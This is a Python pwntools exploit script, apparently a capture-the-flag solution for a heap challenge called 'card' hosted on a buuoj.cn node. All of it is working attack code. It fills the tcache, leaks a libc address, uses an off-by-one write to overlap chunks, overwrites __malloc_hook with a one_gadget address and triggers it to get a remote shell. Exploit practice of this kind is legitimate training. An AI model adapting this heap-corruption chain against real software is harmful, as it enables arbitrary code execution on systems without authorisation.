# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
context.log_level = 'debug'

binary = 'card'
elf = ELF('card')
libc = ELF("libc.so")
context.binary = binary

DEBUG = 0
if DEBUG:
  p = process(binary)
  #p = process(["qemu-aarch64","-L","",binary])
  #p = process(["qemu-aarch64","-L","",-g,"1234",binary])
else:
  host = "node3.buuoj.cn"
  port =  25850
  p = remote(host,port)

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
sla = lambda a,b  :p.sendlineafter(str(a),str(b))
sa  = lambda a,b  :p.sendafter(str(a),str(b))
lg  = lambda name,data : p.success(name + ": 0x%x" % data)
se  = lambda payload: p.send(payload)
rl  = lambda      : p.recv()
sl  = lambda payload: p.sendline(payload)
ru  = lambda a     :p.recvuntil(str(a))

def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
  sla("choice:",num)

def add(id,size,text):
  cmd(1)
  sla("card:",id)
  sla("power:",size)
  sla("quickly!",text)

def edit(id,text):
  cmd(2)
  sla("card",id)
  sla("show",text)

def delete(id):
  cmd(3)
  sla("card:",id)

def show(id):
  cmd(4)
  sla(":",id)

one_gadget = [0x4f2c5,0x4f322,0x10a38c]

for i in range(7):
  add(i,0x98,"aaaa")

add(7,0x98,"aaaa")
add(8,0x98,"aaaa")

for i in range(7):
  delete(i)

delete(7)
add(9,0x18,"aaa")
add(10,0x18,"aaa")
add(11,0x18,"aaa")

show(9)
l64()

__malloc_hook = l64() - 240 - 16
lg("leak",__malloc_hook)
libc_base = __malloc_hook - libc.sym["__malloc_hook"]

edit(9,"\x00"*0x18 + "\x41" )
delete(10)

add(10,0x38,"aaa")

delete(11)
payload = p64(0) *3 + p64(0x21) + p64(__malloc_hook)

edit(10,payload)

add(0,0x18,"aaa")
add(1,0x18,p64(one_gadget[2]+libc_base))

cmd(1)
sla("card:",3)
sla("power:",0x10)

p.interactive()
